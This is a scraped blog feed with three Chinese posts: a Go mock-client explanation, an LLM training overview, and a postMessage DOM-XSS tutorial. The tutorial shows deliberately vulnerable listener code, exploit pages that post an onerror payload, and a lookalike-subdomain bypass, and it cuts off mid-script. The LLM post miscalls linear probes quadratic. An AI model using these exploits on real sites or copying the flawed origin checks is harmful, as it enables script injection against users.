<li>测试代码中，你可以用 <code>MockTsaInsTemplateClient</code> 实例，直接替换真实的 <code>TsaInsTemplateClient</code> 实例（无需修改业务代码的调用方式）；</li>
<li>业务代码只需要依赖“有这个方法的接口”，模拟客户端就能无缝适配，实现“解耦测试”。</li>
</ul>
<h5 data-id="heading-7">（2）测试时灵活自定义行为，无需修改方法本身</h5>
<p>比如之前的用法示例可以优化为（更贴近真实调用）：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 1. 创建模拟客户端，自定义方法行为</span>
mockClient := &amp;MockTsaInsTemplateClient{
    GetBindInsIdByTimeFunc: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(appId, taskTypeId, product <span class="hljs-type">string</span>)</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
        <span class="hljs-keyword">return</span> []<span class="hljs-type">string</span>{<span class="hljs-string">"ins_123"</span>, <span class="hljs-string">"ins_456"</span>}, <span class="hljs-literal">nil</span> <span class="hljs-comment">// 模拟成功返回</span>
    },
}

<span class="hljs-comment">// 2. 调用方法（和调用真实客户端的写法完全一样！）</span>
ids, err := mockClient.GetBindInsIdByTime(<span class="hljs-string">"app_001"</span>, <span class="hljs-string">"task_01"</span>, <span class="hljs-string">"product_abc"</span>)
<span class="hljs-comment">// 结果：ids = ["ins_123", "ins_456"], err = nil</span>
</code></pre>
<p>如果想模拟失败，只需要修改 <code>GetBindInsIdByTimeFunc</code> 的实现，无需改动 <code>GetBindInsIdByTime</code> 方法本身——这就是“模拟”的核心价值：测试场景可灵活切换，方法入口保持统一。</p>
<h4 data-id="heading-8">4. 对比之前的函数字段：为什么需要这个方法？</h4>





















<table><thead><tr><th>直接调用函数字段 <code>GetBindInsIdByTimeFunc</code></th><th>调用方法 <code>GetBindInsIdByTime</code></th></tr></thead><tbody><tr><td>写法：<code>mockClient.GetBindInsIdByTimeFunc(...)</code></td><td>写法：<code>mockClient.GetBindInsIdByTime(...)</code></td></tr><tr><td>必须先判断是否为 <code>nil</code>（否则崩溃）</td><td>内部已处理 <code>nil</code> 逻辑，安全调用</td></tr><tr><td>和真实客户端的调用方式不一致（需修改代码）</td><td>和真实客户端调用方式完全一致（无缝替换）</td></tr></tbody></table>
<p>简单说：这个方法是“封装层”，既保证了调用安全性，又实现了和真实客户端的接口兼容。</p>
<h4 data-id="heading-9">总结</h4>
<p>这段代码的核心作用是：</p>
<ol>
<li>给模拟客户端 <code>MockTsaInsTemplateClient</code> 绑定一个<strong>与真实客户端同名、同签名的业务方法</strong>，实现“接口兼容”，让测试代码可以无缝替换真实依赖；</li>
<li>方法内部逻辑：优先转发到测试代码自定义的 <code>GetBindInsIdByTimeFunc</code> （实现灵活模拟成功/失败场景），未自定义时返回安全默认值（避免崩溃）。</li>
</ol>
<p>它和之前的结构体定义结合，构成了一个“既安全又灵活”的模拟客户端，是Go语言中“接口驱动测试”的经典实现方式。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LLM 四阶段和 Transformer 架构（四）LLM 的训练过程]]></title>    <link>https://juejin.cn/post/7574745301724004358</link>    <guid>https://juejin.cn/post/7574745301724004358</guid>    <pubDate>2025-11-21T03:20:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574745301724004358" data-draft-id="7574715577702334506" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LLM 四阶段和 Transformer 架构（四）LLM 的训练过程"/> <meta itemprop="keywords" content="LLM"/> <meta itemprop="datePublished" content="2025-11-21T03:20:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小兵张健"/> <meta itemprop="url" content="https://juejin.cn/user/1257497032405229"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LLM 四阶段和 Transformer 架构（四）LLM 的训练过程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1257497032405229/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小兵张健
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:20:58.000Z" title="Fri Nov 21 2025 03:20:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在阶段二中，我主要解释的是推理过程，即根据输入 token 预测下一个 token，这一篇补充下训练过程，如何修改那么多参数。</p>
<p>前面的过程和推理一样，从 Layer1 到 Layer96 称之为<strong>正向传播</strong>，推理过程中只要最后一个 token 的向量，在训练过程中会用到整个 token 序列，是并行计算的。</p>
<p>训练的语料来源于互联网，知识经过过滤( html 标签)、去重、清洗（去掉有害内容）等，一起给 LLM 训练。</p>
<p>LLM 预测的下一个 token 和正确的 token 之间误差称之为 Loss，整体的目标就是将 Loss 最小化。</p>
<p>拿到 Loss 后，再通过<strong>反向传播</strong>，从 Layer96 到 Layer1 逐级修改参数。</p>
<p>Layer96 会根据 Loss 调节自己的参数，Loss 差距是由于自己这层的参数，和 Layer95 的输入共同决定的。</p>
<p>更新参数的公式为：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>新参数</mtext><mo>=</mo><mtext>旧参数</mtext><mo>−</mo><mo stretchy="false">(</mo><mtext>学习率</mtext><mo>×</mo><mtext>梯度</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{新参数} = \text{旧参数} - (\text{学习率} \times \text{梯度})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord text"><span class="mord cjk_fallback">新参数</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord text"><span class="mord cjk_fallback">旧参数</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">学习率</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord cjk_fallback">梯度</span></span><span class="mclose">)</span></span></span></span></span></p>
<p><strong>梯度</strong>表示正负方向和大小（比如 -1，+100），<strong>学习率</strong>表示折扣系数，缓解梯度过于陡峭。</p>
<p>Layer96 调节完后会告诉 Layer95 给他的输入 Loss，Layer95 执行同样的操作后给 Layer94，直到整个参数都会全部微调一遍。</p>
<p>经历多轮调整后，整体的 Loss 降到足够低，LLM 涌现出 “智慧”，好似能理解语言了。</p>
<p>参数的摆放是黑盒，我们不知道具体参数是怎么设置的，只能通过检测来判断。人类无法拆开 1760 亿个参数依次校验。</p>
<p>校验的方法用<strong>线性探针</strong>，即一个线性函数，一元二次方程。</p>
<p>比如训练好了一个影评评分 LLM，看结果向量和评分之间是否有线性关系，如果有的话说明训练结果是好的，在这个向量里面已经隐藏了评分的维度，并且可以方便的分析出来。</p>
<p>或者我们想知道在哪一层 Layer 向量融合了感情维度，也是获取这一层的向量结果，和输入 token 对应的情感，看有没有线性关系。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[利用配置错误的postMessage()函数实现DOM型XSS攻击]]></title>    <link>https://juejin.cn/post/7574728397373767732</link>    <guid>https://juejin.cn/post/7574728397373767732</guid>    <pubDate>2025-11-21T03:15:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574728397373767732" data-draft-id="7574728397373751348" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="利用配置错误的postMessage()函数实现DOM型XSS攻击"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2025-11-21T03:15:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            利用配置错误的postMessage()函数实现DOM型XSS攻击
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:15:38.000Z" title="Fri Nov 21 2025 03:15:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">利用配置错误的postMessage()函数实现DOM型XSS攻击</h2>
<p>今天，我们将讨论如何通过配置错误的postMessage函数利用DOM型XSS漏洞。两个站点只有在具有相同协议、主机名和端口时才能相互通信。</p>
<p>如果两个站点不具备上述相似属性，将触发同源策略。</p>
<p>有几种方法可以绕过同源策略，其中之一就是postMessage函数。postMessage方法安全地实现了Window对象之间的跨源通信。postMessage使用两种方法在窗口之间进行交叉通信：</p>
<ul>
<li>window.addEventListener</li>
<li>postMessage()</li>
</ul>
<p>以下是postMessage()函数配置错误并容易受到DOM型XSS攻击的不同场景。</p>
<h3 data-id="heading-1">场景1：无源验证检查</h3>
<p>在此场景中，没有源检查/验证，这意味着应用程序将接收来自任何使用postMessage()函数的域的消息。</p>
<p><strong>漏洞代码</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSS_ME_<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>        
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>    
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">          
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'message'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {           
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'s'</span>).<span class="hljs-property">innerHTML</span> = e.<span class="hljs-property">data</span>.<span class="hljs-property">s</span>;
    })
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>                            
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"s"</span>&gt;</span>Postmessage XSS<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>            
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">input</span>&gt;</span>                            
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Click"</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>            
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>         
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>从代码片段可以看出，没有实现源验证。</p>
<p>在此场景中，攻击者使用postMessage()函数构建漏洞利用程序，这将允许跨源通信，攻击者将能够将XSS有效负载传递到受害者/主应用程序中。</p>
<p><strong>利用代码</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">button</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Click Me"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"btn"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'btn'</span>).<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>){       
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">poc</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">'http://begbounty.xyz/postmessage1.html'</span>);    
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){        
          <span class="hljs-variable language_">window</span>.<span class="hljs-property">poc</span>.<span class="hljs-title function_">postMessage</span>({                                           
              <span class="hljs-string">"s"</span>: <span class="hljs-string">"&lt;img src =x onerror=alert(1);&gt;"</span>,                      
          },                     
          <span class="hljs-string">'*'</span>             
          );   
      }, <span class="hljs-number">2000</span>);
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">场景2：应用程序使用indexOf()函数进行源验证</h3>
<p>在此场景中，应用程序使用indexOf()函数进行源验证。在这种情况下，函数检查白名单域是否包含在源中。使用indexOf()函数进行源验证是不良实践，因为可以通过创建以indexOf()函数中给定字符串开头的子域来绕过此验证。</p>
<p><strong>漏洞代码</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>        
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSS_ME_<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> 
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>   
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">             
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'message'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {                 
            <span class="hljs-keyword">if</span>(e.<span class="hljs-property">origin</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">"begbounty.xyz"</span>) &gt; <span class="hljs-number">0</span>){                
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'s'</span>).<span class="hljs-property">innerHTML</span> = e.<span class="hljs-property">data</span>.<span class="hljs-property">s</span>;                         
            }             
        });   
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>  
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span> 
                <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"s"</span>&gt;</span>Postmessage XSS<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span> 
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">input</span>&gt;</span>                            
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"hehe!"</span>&gt;</span>                            
            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span> 
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> 
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>如上所述代码所示，应用程序正在使用indexOf()函数进行源验证：</p>
<pre><code class="hljs language-javascript" lang="javascript">(e.<span class="hljs-property">origin</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">"begbounty.xyz"</span>) &gt; <span class="hljs-number">0</span>)
</code></pre>
<p>为了利用此错误配置，我创建了一个子域，将在其中托管利用代码：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fbegbounty.xyz.x3b.in%2Findex.html" target="_blank" title="https://begbounty.xyz.x3b.in/index.html" ref="nofollow noopener noreferrer">begbounty.xyz.x3b.in/index.html</a></p>
<p><strong>利用代码</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">button</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Click Me"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"btn"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
